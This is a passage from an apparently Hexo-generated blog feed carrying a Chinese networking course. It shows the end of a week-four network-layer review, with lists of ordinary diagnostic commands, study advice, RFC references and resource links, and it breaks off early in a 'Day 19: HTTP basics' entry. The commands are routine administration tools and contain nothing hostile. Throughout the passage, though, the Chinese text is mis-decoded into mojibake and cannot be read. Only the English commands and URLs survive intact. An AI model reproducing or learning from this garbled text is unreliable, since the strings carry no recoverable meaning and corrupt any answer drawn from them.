class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># è¿é€šæ€§æµ‹è¯•</span><br>ping &lt;ç›®æ ‡&gt;<br>ping6 &lt;IPv6ç›®æ ‡&gt;<br><br><span class="hljs-comment"># è·¯å¾„è¿½è¸ª</span><br>traceroute &lt;ç›®æ ‡&gt;<br>traceroute6 &lt;IPv6ç›®æ ‡&gt;<br>tracert &lt;ç›®æ ‡&gt;  <span class="hljs-comment"># Windows</span><br><br><span class="hljs-comment"># ARPç®¡ç†</span><br>arp -a          <span class="hljs-comment"># æŸ¥çœ‹ARPç¼“å­˜</span><br>arp -d &lt;IP&gt;     <span class="hljs-comment"># åˆ é™¤ARPæ¡ç›®</span><br>arp -s &lt;IP&gt; &lt;MAC&gt;  <span class="hljs-comment"># æ·»åŠ é™æ€ARP</span><br>ip neigh show   <span class="hljs-comment"># Linuxæ–°å‘½ä»¤</span><br><br><span class="hljs-comment"># è·¯ç”±ç®¡ç†</span><br>route -n        <span class="hljs-comment"># æŸ¥çœ‹è·¯ç”±è¡¨</span><br>ip route show   <span class="hljs-comment"># Linuxæ–°å‘½ä»¤</span><br>route add       <span class="hljs-comment"># æ·»åŠ è·¯ç”±</span><br>route del       <span class="hljs-comment"># åˆ é™¤è·¯ç”±</span><br><br><span class="hljs-comment"># ç½‘ç»œé…ç½®</span><br>ifconfig        <span class="hljs-comment"># è€å‘½ä»¤</span><br>ip addr show    <span class="hljs-comment"># æ–°å‘½ä»¤</span><br>ip <span class="hljs-built_in">link</span> show    <span class="hljs-comment"># é“¾è·¯å±‚ä¿¡æ¯</span><br></code></pre></td></tr></table></figure><h3 id="ç½‘ç»œåˆ†æå·¥å…·"><a href="#ç½‘ç»œåˆ†æå·¥å…·" class="headerlink" title="ç½‘ç»œåˆ†æå·¥å…·"></a>ç½‘ç»œåˆ†æå·¥å…·</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æŠ“åŒ…åˆ†æ</span><br>tcpdump -i eth0 icmp<br>tcpdump -i eth0 arp<br>wireshark<br><br><span class="hljs-comment"># è¿æ¥çŠ¶æ€</span><br>netstat -an<br>ss -antp<br><br><span class="hljs-comment"># DNSæŸ¥è¯¢</span><br>nslookup &lt;åŸŸå&gt;<br>dig &lt;åŸŸå&gt;<br>host &lt;åŸŸå&gt;<br><br><span class="hljs-comment"># ç½‘ç»œæ€§èƒ½</span><br>iperf3 -s       <span class="hljs-comment"># æœåŠ¡ç«¯</span><br>iperf3 -c &lt;æœåŠ¡å™¨&gt;  <span class="hljs-comment"># å®¢æˆ·ç«¯</span><br>mtr &lt;ç›®æ ‡&gt;      <span class="hljs-comment"># å®æ—¶è·¯ç”±è¿½è¸ª</span><br></code></pre></td></tr></table></figure><hr><h2 id="ğŸ“ˆ-æŠ€èƒ½æå‡"><a href="#ğŸ“ˆ-æŠ€èƒ½æå‡" class="headerlink" title="ğŸ“ˆ æŠ€èƒ½æå‡"></a>ğŸ“ˆ æŠ€èƒ½æå‡</h2><h3 id="ç†è®ºçŸ¥è¯†"><a href="#ç†è®ºçŸ¥è¯†" class="headerlink" title="ç†è®ºçŸ¥è¯†"></a>ç†è®ºçŸ¥è¯†</h3><ul><li>âœ… æ·±å…¥ç†è§£IPåè®®ï¼ˆIPv4&#x2F;IPv6ï¼‰</li><li>âœ… æŒæ¡å­ç½‘åˆ’åˆ†å’Œè·¯ç”±</li><li>âœ… ç†è§£ICMPå’ŒARPåè®®</li><li>âœ… äº†è§£åŠ¨æ€è·¯ç”±åè®®</li><li>âœ… æŒæ¡ç½‘ç»œè¯Šæ–­æ–¹æ³•</li></ul><h3 id="å®è·µèƒ½åŠ›"><a href="#å®è·µèƒ½åŠ›" class="headerlink" title="å®è·µèƒ½åŠ›"></a>å®è·µèƒ½åŠ›</h3><ul><li>âœ… åŸå§‹å¥—æ¥å­—ç¼–ç¨‹</li><li>âœ… ç½‘ç»œåè®®å®ç°</li><li>âœ… æ•°æ®åŒ…æ„é€ å’Œè§£æ</li><li>âœ… ç½‘ç»œè¯Šæ–­å’Œæ’é”™</li><li>âœ… æ€§èƒ½ä¼˜åŒ–</li></ul><h3 id="å·¥å…·ä½¿ç”¨"><a href="#å·¥å…·ä½¿ç”¨" class="headerlink" title="å·¥å…·ä½¿ç”¨"></a>å·¥å…·ä½¿ç”¨</h3><ul><li>âœ… pingã€tracerouteç†Ÿç»ƒä½¿ç”¨</li><li>âœ… ARPã€routeå‘½ä»¤æŒæ¡</li><li>âœ… tcpdumpæŠ“åŒ…åˆ†æ</li><li>âœ… ç½‘ç»œé…ç½®å‘½ä»¤</li></ul><hr><h2 id="ğŸ“Š-å­¦ä¹ ç»Ÿè®¡"><a href="#ğŸ“Š-å­¦ä¹ ç»Ÿè®¡" class="headerlink" title="ğŸ“Š å­¦ä¹ ç»Ÿè®¡"></a>ğŸ“Š å­¦ä¹ ç»Ÿè®¡</h2><h3 id="æ—¶é—´åˆ†é…"><a href="#æ—¶é—´åˆ†é…" class="headerlink" title="æ—¶é—´åˆ†é…"></a>æ—¶é—´åˆ†é…</h3><ul><li>ç†è®ºå­¦ä¹ ï¼š35%</li><li>ç¼–ç å®è·µï¼š45%</li><li>è°ƒè¯•æµ‹è¯•ï¼š20%</li></ul><h3 id="ä»£ç é‡"><a href="#ä»£ç é‡" class="headerlink" title="ä»£ç é‡"></a>ä»£ç é‡</h3><ul><li>ç†è®ºæ–‡æ¡£ï¼šçº¦10000è¡Œ</li><li>å®æˆ˜ä»£ç ï¼šçº¦4000è¡Œ</li><li>æ€»è®¡ï¼šçº¦14000è¡Œ</li></ul><h3 id="é¡¹ç›®æ•°é‡"><a href="#é¡¹ç›®æ•°é‡" class="headerlink" title="é¡¹ç›®æ•°é‡"></a>é¡¹ç›®æ•°é‡</h3><ul><li>å®Œæ•´é¡¹ç›®ï¼š6ä¸ª</li><li>å°å‹demoï¼š10+ä¸ª</li><li>ç»ƒä¹ é¢˜ï¼š20+é“</li></ul><hr><h2 id="ğŸ“-å­¦ä¹ å»ºè®®"><a href="#ğŸ“-å­¦ä¹ å»ºè®®" class="headerlink" title="ğŸ“ å­¦ä¹ å»ºè®®"></a>ğŸ“ å­¦ä¹ å»ºè®®</h2><h3 id="å·©å›ºçŸ¥è¯†"><a href="#å·©å›ºçŸ¥è¯†" class="headerlink" title="å·©å›ºçŸ¥è¯†"></a>å·©å›ºçŸ¥è¯†</h3><ol><li><p><strong>å¤ä¹ æ ¸å¿ƒæ¦‚å¿µ</strong></p><ul><li>IPåœ°å€å’Œå­ç½‘åˆ’åˆ†</li><li>è·¯ç”±è¡¨æŸ¥æ‰¾è¿‡ç¨‹</li><li>ARPå·¥ä½œæµç¨‹</li><li>ICMPæ¶ˆæ¯ç±»å‹</li></ul></li><li><p><strong>åŠ¨æ‰‹å®è·µ</strong></p><ul><li>é‡å†™å…³é”®é¡¹ç›®</li><li>é…ç½®å®é™…ç½‘ç»œè®¾å¤‡</li><li>è§£å†³å®é™…ç½‘ç»œé—®é¢˜</li><li>ä¼˜åŒ–ç½‘ç»œæ€§èƒ½</li></ul></li><li><p><strong>æ·±å…¥ç†è§£</strong></p><ul><li>é˜…è¯»RFCæ–‡æ¡£<ul><li>RFC 791: IP</li><li>RFC 792: ICMP</li><li>RFC 826: ARP</li><li>RFC 2453: RIP</li><li>RFC 2328: OSPF</li></ul></li><li>æŸ¥çœ‹Linuxå†…æ ¸ç½‘ç»œæ ˆæºç </li><li>åˆ†æçœŸå®ç½‘ç»œæµé‡</li></ul></li></ol><h3 id="æ‰©å±•å­¦ä¹ "><a href="#æ‰©å±•å­¦ä¹ " class="headerlink" title="æ‰©å±•å­¦ä¹ "></a>æ‰©å±•å­¦ä¹ </h3><ol><li><p><strong>ç½‘ç»œæ¨¡æ‹Ÿ</strong></p><ul><li>GNS3ï¼šç½‘ç»œè®¾å¤‡æ¨¡æ‹Ÿ</li><li>Packet Tracerï¼šCiscoæ¨¡æ‹Ÿå™¨</li><li>EVE-NGï¼šå¤šå‚å•†æ¨¡æ‹Ÿ</li></ul></li><li><p><strong>é«˜çº§è·¯ç”±</strong></p><ul><li>BGPåè®®</li><li>MPLS</li><li>VRF</li><li>è·¯ç”±ç­–ç•¥</li></ul></li><li><p><strong>SDNï¼ˆè½¯ä»¶å®šä¹‰ç½‘ç»œï¼‰</strong></p><ul><li>OpenFlow</li><li>ONOS&#x2F;ODLæ§åˆ¶å™¨</li><li>P4ç¼–ç¨‹</li></ul></li><li><p><strong>ç½‘ç»œè‡ªåŠ¨åŒ–</strong></p><ul><li>Ansibleç½‘ç»œæ¨¡å—</li><li>Python Netmiko</li><li>NETCONF&#x2F;RESTCONF</li></ul></li></ol><hr><h2 id="ğŸš€-ä¸‹å‘¨é¢„å‘Š"><a href="#ğŸš€-ä¸‹å‘¨é¢„å‘Š" class="headerlink" title="ğŸš€ ä¸‹å‘¨é¢„å‘Š"></a>ğŸš€ ä¸‹å‘¨é¢„å‘Š</h2><p><strong>ç¬¬äº”å‘¨ï¼šç½‘ç»œå®‰å…¨åŸºç¡€ï¼ˆDay 28-35ï¼‰</strong></p><h3 id="ä¸»è¦å†…å®¹"><a href="#ä¸»è¦å†…å®¹" class="headerlink" title="ä¸»è¦å†…å®¹"></a>ä¸»è¦å†…å®¹</h3><ul><li>ç½‘ç»œå®‰å…¨æ¦‚è¿°</li><li>é˜²ç«å¢™æŠ€æœ¯ï¼ˆiptables&#x2F;nftablesï¼‰</li><li>VPNå’Œéš§é“æŠ€æœ¯</li><li>å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼ˆIDS&#x2F;IPSï¼‰</li><li>SSL&#x2F;TLSæ·±å…¥</li><li>ç½‘ç»œæ”»å‡»å’Œé˜²å¾¡</li><li>å®‰å…¨åŠ å›º</li><li>ç»¼åˆå®‰å…¨é¡¹ç›®</li></ul><h3 id="å­¦ä¹ ç›®æ ‡"><a href="#å­¦ä¹ ç›®æ ‡" class="headerlink" title="å­¦ä¹ ç›®æ ‡"></a>å­¦ä¹ ç›®æ ‡</h3><ul><li>ç†è§£ç½‘ç»œå®‰å…¨å¨èƒ</li><li>æŒæ¡é˜²æŠ¤æŠ€æœ¯</li><li>å­¦ä¹ å®‰å…¨å·¥å…·</li><li>å®ç°å®‰å…¨é¡¹ç›®</li><li>åŸ¹å…»å®‰å…¨æ„è¯†</li></ul><h3 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h3><ul><li>å¤ä¹ æœ¬å‘¨å†…å®¹</li><li>äº†è§£å¸¸è§ç½‘ç»œæ”»å‡»</li><li>å‡†å¤‡è™šæ‹Ÿæœºç¯å¢ƒ</li><li>é˜…è¯»å®‰å…¨ç›¸å…³æ–‡æ¡£</li></ul><hr><h2 id="ğŸ’¡-æœ¬å‘¨æ€»ç»“"><a href="#ğŸ’¡-æœ¬å‘¨æ€»ç»“" class="headerlink" title="ğŸ’¡ æœ¬å‘¨æ€»ç»“"></a>ğŸ’¡ æœ¬å‘¨æ€»ç»“</h2><h3 id="ä¸»è¦æˆå°±"><a href="#ä¸»è¦æˆå°±" class="headerlink" title="ä¸»è¦æˆå°±"></a>ä¸»è¦æˆå°±</h3><p>âœ… å®Œæ•´å­¦ä¹ ç½‘ç»œå±‚åè®®<br>âœ… ç†è§£IPå¯»å€å’Œè·¯ç”±<br>âœ… æŒæ¡ç½‘ç»œè¯Šæ–­å·¥å…·<br>âœ… å®ç°6ä¸ªå®æˆ˜é¡¹ç›®<br>âœ… å­¦ä¼šç½‘ç»œæ’é”™æ–¹æ³•</p><h3 id="å…³é”®æ”¶è·"><a href="#å…³é”®æ”¶è·" class="headerlink" title="å…³é”®æ”¶è·"></a>å…³é”®æ”¶è·</h3><ol><li><p><strong>IPåè®®æ˜¯ç½‘ç»œçš„åŸºç¡€</strong></p><ul><li>åœ°å€æ˜¯ç½‘ç»œçš„èº«ä»½è¯</li><li>è·¯ç”±æ˜¯ç½‘ç»œçš„å¯¼èˆªç³»ç»Ÿ</li><li>å­ç½‘åˆ’åˆ†æ˜¯èµ„æºçš„åˆç†åˆ†é…</li></ul></li><li><p><strong>è¯Šæ–­å·¥å…·å¾ˆé‡è¦</strong></p><ul><li>pingæµ‹è¯•è¿é€šæ€§</li><li>tracerouteè¿½è¸ªè·¯å¾„</li><li>ç³»ç»ŸåŒ–æ’é”™æ–¹æ³•</li></ul></li><li><p><strong>å®‰å…¨ä¸å®¹å¿½è§†</strong></p><ul><li>ARPæ¬ºéª—å¨èƒå¾ˆå¤§</li><li>äº¤æ¢æœºå®‰å…¨é…ç½®å¿…è¦</li><li>åŠ å¯†é€šä¿¡å¾ˆé‡è¦</li></ul></li><li><p><strong>åŠ¨æ€è·¯ç”±æ›´æ™ºèƒ½</strong></p><ul><li>è‡ªåŠ¨é€‚åº”ç½‘ç»œå˜åŒ–</li><li>æä¾›å†—ä½™å’Œè´Ÿè½½å‡è¡¡</li><li>é€‚åˆå¤§å‹ç½‘ç»œ</li></ul></li></ol><h3 id="å¾…æå‡é¢†åŸŸ"><a href="#å¾…æå‡é¢†åŸŸ" class="headerlink" title="å¾…æå‡é¢†åŸŸ"></a>å¾…æå‡é¢†åŸŸ</h3><ul><li>BGPç­‰é«˜çº§è·¯ç”±åè®®</li><li>å¤§è§„æ¨¡ç½‘ç»œè®¾è®¡</li><li>SDNè½¯ä»¶å®šä¹‰ç½‘ç»œ</li><li>ç½‘ç»œç¼–ç¨‹ä¼˜åŒ–</li></ul><hr><h2 id="ğŸ“-å­¦ä¹ å¿ƒå¾—"><a href="#ğŸ“-å­¦ä¹ å¿ƒå¾—" class="headerlink" title="ğŸ“ å­¦ä¹ å¿ƒå¾—"></a>ğŸ“ å­¦ä¹ å¿ƒå¾—</h2><p><strong>æœ¬å‘¨æ˜¯ç½‘ç»œå­¦ä¹ çš„æ ¸å¿ƒå‘¨ä¹‹ä¸€</strong>ï¼Œæˆ‘ä»¬æ·±å…¥å­¦ä¹ äº†ç½‘ç»œå±‚åè®®ï¼Œç†è§£äº†äº’è”ç½‘çš„å·¥ä½œåŸç†ã€‚</p><p><strong>IPåè®®</strong>æ˜¯æ•´ä¸ªäº’è”ç½‘çš„åŸºçŸ³ã€‚ä»IPv4åˆ°IPv6ï¼Œä»åœ°å€åˆ†é…åˆ°è·¯ç”±è½¬å‘ï¼Œæ¯ä¸ªç»†èŠ‚éƒ½è‡³å…³é‡è¦ã€‚ç†è§£äº†IPï¼Œå°±ç†è§£äº†æ•°æ®å¦‚ä½•åœ¨å…¨çƒç½‘ç»œä¸­ä¼ è¾“ã€‚</p><p><strong>ICMPåè®®</strong>è™½ç„¶ç®€å•ï¼Œä½†ä½œç”¨å·¨å¤§ã€‚pingå’Œtracerouteç­‰è¯Šæ–­å·¥å…·åŸºäºICMPï¼Œæ˜¯æˆ‘ä»¬æ’æŸ¥ç½‘ç»œé—®é¢˜çš„åˆ©å™¨ã€‚</p><p><strong>ARPåè®®</strong>è¿æ¥äº†ç½‘ç»œå±‚å’Œé“¾è·¯å±‚ï¼Œæ˜¯æœ¬åœ°ç½‘ç»œé€šä¿¡çš„å…³é”®ã€‚åŒæ—¶ARPå®‰å…¨é—®é¢˜æé†’æˆ‘ä»¬ï¼Œç½‘ç»œå®‰å…¨æ— å°äº‹ã€‚</p><p><strong>è·¯ç”±åè®®</strong>è®©ç½‘ç»œå˜å¾—æ™ºèƒ½ã€‚ä»ç®€å•çš„é™æ€è·¯ç”±åˆ°å¤æ‚çš„åŠ¨æ€è·¯ç”±ï¼Œç½‘ç»œèƒ½å¤Ÿè‡ªåŠ¨é€‚åº”å˜åŒ–ï¼Œè¿™æ˜¯äº’è”ç½‘èƒ½å¤Ÿå¦‚æ­¤åºå¤§è€Œç¨³å®šçš„åŸå› ä¹‹ä¸€ã€‚</p><p><strong>å®è·µæ˜¯æ£€éªŒçœŸç†çš„å”¯ä¸€æ ‡å‡†</strong>ã€‚é€šè¿‡ç¼–å†™pingã€tracerouteã€ARPå·¥å…·ï¼Œæˆ‘ä»¬ä¸ä»…ç†è§£äº†åè®®åŸç†ï¼Œæ›´æŒæ¡äº†å®ç°ç»†èŠ‚ã€‚</p><p><strong>ç³»ç»ŸåŒ–çš„æ€ç»´å¾ˆé‡è¦</strong>ã€‚ç½‘ç»œæ’é”™ä¸æ˜¯ç›²ç›®å°è¯•ï¼Œè€Œæ˜¯æŒ‰ç…§OSIæ¨¡å‹ä»åº•å±‚åˆ°é«˜å±‚ï¼Œä»è¿‘åˆ°è¿œï¼Œé€æ­¥å®šä½é—®é¢˜ã€‚</p><hr><h2 id="ğŸŒŸ-æ¿€åŠ±è¯­å½•"><a href="#ğŸŒŸ-æ¿€åŠ±è¯­å½•" class="headerlink" title="ğŸŒŸ æ¿€åŠ±è¯­å½•"></a>ğŸŒŸ æ¿€åŠ±è¯­å½•</h2><blockquote><p>â€œç½‘ç»œåè®®å°±åƒè¯­è¨€ï¼Œåªæœ‰çœŸæ­£ä½¿ç”¨ï¼Œæ‰èƒ½çœŸæ­£æŒæ¡ã€‚â€</p></blockquote><p>æœ¬å‘¨çš„å­¦ä¹ å¼ºåº¦å¾ˆå¤§ï¼Œä½†æ”¶è·ä¹Ÿå¾ˆå¤§ã€‚ä½ å·²ç»æŒæ¡äº†ç½‘ç»œå±‚çš„æ ¸å¿ƒçŸ¥è¯†ï¼Œèƒ½å¤Ÿç‹¬ç«‹è¯Šæ–­å’Œè§£å†³å¤§éƒ¨åˆ†ç½‘ç»œé—®é¢˜ã€‚</p><p>ç»§ç»­ä¿æŒå­¦ä¹ çš„çƒ­æƒ…ï¼å››å‘¨ä¸‹æ¥ï¼Œä½ å·²ç»å»ºç«‹äº†ä»ç‰©ç†å±‚åˆ°ç½‘ç»œå±‚çš„å®Œæ•´çŸ¥è¯†ä½“ç³»ã€‚</p><p>ä¸‹å‘¨æˆ‘ä»¬å°†è¿›å…¥æ¿€åŠ¨äººå¿ƒçš„ç½‘ç»œå®‰å…¨é¢†åŸŸï¼Œå­¦ä¹ å¦‚ä½•ä¿æŠ¤ç½‘ç»œå…å—æ”»å‡»ã€‚è¿™æ˜¯ç½‘ç»œå·¥ç¨‹å¸ˆå¿…å¤‡çš„æŠ€èƒ½ï¼</p><p>åŠ æ²¹ï¼ğŸ’ª</p><hr><p><strong>å­¦ä¹ è¿›åº¦ï¼š27&#x2F;180å¤©ï¼ˆ15.0%ï¼‰</strong></p><p><strong>å·²å®Œæˆï¼š4å‘¨</strong><br><strong>å‰©ä½™ï¼š22å‘¨</strong></p><hr><h2 id="ğŸ“š-æ¨èèµ„æº"><a href="#ğŸ“š-æ¨èèµ„æº" class="headerlink" title="ğŸ“š æ¨èèµ„æº"></a>ğŸ“š æ¨èèµ„æº</h2><h3 id="ä¹¦ç±"><a href="#ä¹¦ç±" class="headerlink" title="ä¹¦ç±"></a>ä¹¦ç±</h3><ul><li>ã€ŠTCP&#x2F;IPè¯¦è§£ å·1ï¼šåè®®ã€‹- ç»å…¸å¿…è¯»</li><li>ã€Šè®¡ç®—æœºç½‘ç»œã€‹ï¼ˆè°¢å¸Œä»ï¼‰- ä¸­æ–‡æ•™æ</li><li>ã€ŠCCNAå­¦ä¹ æŒ‡å—ã€‹- å®ç”¨é…ç½®</li><li>ã€ŠWiresharkç½‘ç»œåˆ†æå°±è¿™ä¹ˆç®€å•ã€‹- æŠ“åŒ…åˆ†æ</li></ul><h3 id="åœ¨çº¿èµ„æº"><a href="#åœ¨çº¿èµ„æº" class="headerlink" title="åœ¨çº¿èµ„æº"></a>åœ¨çº¿èµ„æº</h3><ul><li>RFC Editor: <a href="https://www.rfc-editor.org/">https://www.rfc-editor.org</a></li><li>IPv6æ•™è‚²ç½‘ç«™: <a href="https://www.ipv6.com/">https://www.ipv6.com</a></li><li>å­ç½‘åˆ’åˆ†è®¡ç®—å™¨: <a href="http://www.subnet-calculator.com/">http://www.subnet-calculator.com</a></li><li>Ciscoå­¦ä¹ ç½‘ç»œ: <a href="https://www.cisco.com/c/en/us/training-events/training-certifications.html">https://www.cisco.com/c/en/us/training-events/training-certifications.html</a></li></ul><h3 id="å®è·µå¹³å°"><a href="#å®è·µå¹³å°" class="headerlink" title="å®è·µå¹³å°"></a>å®è·µå¹³å°</h3><ul><li>GNS3: <a href="https://www.gns3.com/">https://www.gns3.com</a></li><li>Packet Tracer: <a href="https://www.netacad.com/courses/packet-tracer">https://www.netacad.com/courses/packet-tracer</a></li><li>Hack The Box: <a href="https://www.hackthebox.eu(å®‰å…¨å®è·µ)/">https://www.hackthebox.euï¼ˆå®‰å…¨å®è·µï¼‰</a></li></ul><h3 id="è§†é¢‘æ•™ç¨‹"><a href="#è§†é¢‘æ•™ç¨‹" class="headerlink" title="è§†é¢‘æ•™ç¨‹"></a>è§†é¢‘æ•™ç¨‹</h3><ul><li>YouTube: NetworkChuck, David Bombal</li><li>Bilibili: æœç´¢â€è®¡ç®—æœºç½‘ç»œâ€ã€â€ç½‘ç»œåè®®â€</li></ul><hr><p><strong>ç»§ç»­åŠ æ²¹ï¼ä¸‹å‘¨è§ï¼</strong> ğŸš€</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>19å¤©ï¼šHTTPåè®®åŸºç¡€</title>
    <link href="/2025/11/10/19%E5%A4%A9%EF%BC%9AHTTP%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/11/10/19%E5%A4%A9%EF%BC%9AHTTP%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬19å¤©ï¼šHTTPåè®®åŸºç¡€"><a href="#ç¬¬19å¤©ï¼šHTTPåè®®åŸºç¡€" class="headerlink" title="ç¬¬19å¤©ï¼šHTTPåè®®åŸºç¡€"></a>ç¬¬19å¤©ï¼šHTTPåè®®åŸºç¡€</h1><h2 id="ä»Šæ—¥ç›®æ ‡"><a href="#ä»Šæ—¥ç›®æ ‡" class="headerlink" title="ä»Šæ—¥ç›®æ ‡"></a>ä»Šæ—¥ç›®æ ‡</h2><ul><li>ç†è§£HTTPåè®®çš„å·¥ä½œåŸç†</li><li>æŒæ¡HTTPè¯·æ±‚å’Œå“åº”æ ¼å¼</li><li>å­¦ä¹ HTTPæ–¹æ³•å’ŒçŠ¶æ€ç </li><li>äº†è§£HTTPå¤´éƒ¨å­—æ®µ</li><li>ç†è§£Cookieå’ŒSessionæœºåˆ¶</li><li>å­¦ä¹ HTTPç‰ˆæœ¬æ¼”è¿›</li><li>å®ç°ç®€å•çš„HTTPæœåŠ¡å™¨</li></ul><hr><h2 id="1-HTTPåè®®æ¦‚è¿°"><a href="#1-HTTPåè®®æ¦‚è¿°" class="headerlink" title="1. HTTPåè®®æ¦‚è¿°"></a>1. HTTPåè®®æ¦‚è¿°</h2><h3 id="1-1-ä»€ä¹ˆæ˜¯HTTPï¼Ÿ"><a href="#1-1-ä»€ä¹ˆæ˜¯HTTPï¼Ÿ" class="headerlink" title="1.1 ä»€ä¹ˆæ˜¯HTTPï¼Ÿ"></a>1.1 ä»€ä¹ˆæ˜¯HTTPï¼Ÿ</h3><p><strong>HTTPï¼ˆHyperText Transfer Protocolï¼‰</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown">HTTP = è¶…æ–‡æœ¬ä¼ è¾“åè®®<br><br>ç”Ÿæ´»ç±»æ¯”ï¼š<br>HTTPå°±åƒé‚®å¯„ç³»ç»Ÿï¼š<br><span class="hljs-bullet">1.</span> ä½ å†™ä¿¡ï¼ˆHTTPè¯·æ±‚ï¼‰<br><span class="hljs-bullet">2.</span> é‚®é€’å‘˜é€ä¿¡ï¼ˆç½‘ç»œä¼ è¾“ï¼‰<br><span class="hljs-bullet">3.</span> æ”¶ä¿¡äººå›å¤ï¼ˆHTTPå“åº”ï¼‰<br><span class="hljs-bullet">4.</span> é‚®é€’å‘˜é€å›å›ä¿¡ï¼ˆç½‘ç»œä¼ è¾“ï¼‰<br><br>ç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">-</span> æ–‡æœ¬åè®®ï¼ˆå¯è¯»æ€§å¼ºï¼‰<br><span class="hljs-bullet">-</span> æ— çŠ¶æ€ï¼ˆæ¯æ¬¡è¯·æ±‚ç‹¬ç«‹ï¼‰<br><span class="hljs-bullet">-</span> å®¢æˆ·ç«¯-æœåŠ¡å™¨æ¨¡å‹<br><span class="hljs-bullet">-</span> åŸºäºTCPï¼ˆå¯é ä¼ è¾“ï¼‰<br></code></pre></td></tr></table></figure><p><strong>HTTPçš„ä½ç½®</strong>ï¼š</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs armasm">åº”ç”¨å±‚åè®®æ ˆï¼š<br><br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  åº”ç”¨ç¨‹åºï¼ˆæµè§ˆå™¨ã€APPï¼‰    â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  HTTPï¼ˆåº”ç”¨å±‚åè®®ï¼‰         â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  TCPï¼ˆä¼ è¾“å±‚åè®®ï¼‰          â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  <span class="hljs-built_in">IP</span>ï¼ˆç½‘ç»œå±‚åè®®ï¼‰           â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  ç‰©ç†å±‚                     â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><h3 id="1-2-HTTPå·¥ä½œæµç¨‹"><a href="#1-2-HTTPå·¥ä½œæµç¨‹" class="headerlink" title="1.2 HTTPå·¥ä½œæµç¨‹"></a>1.2 HTTPå·¥ä½œæµç¨‹</h3><p><strong>åŸºæœ¬æµç¨‹</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs markdown">å®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨ï¼‰                    æœåŠ¡å™¨<br><br><span class="hljs-bullet">    1.</span> DNSè§£æ<br><span class="hljs-code">       www.example.com â†’ 93.184.216.34</span><br><span class="hljs-code"></span><br><span class="hljs-bullet">    2.</span> å»ºç«‹TCPè¿æ¥<br><span class="hljs-code">       â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;</span><br><span class="hljs-code">       ä¸‰æ¬¡æ¡æ‰‹</span><br><span class="hljs-code">       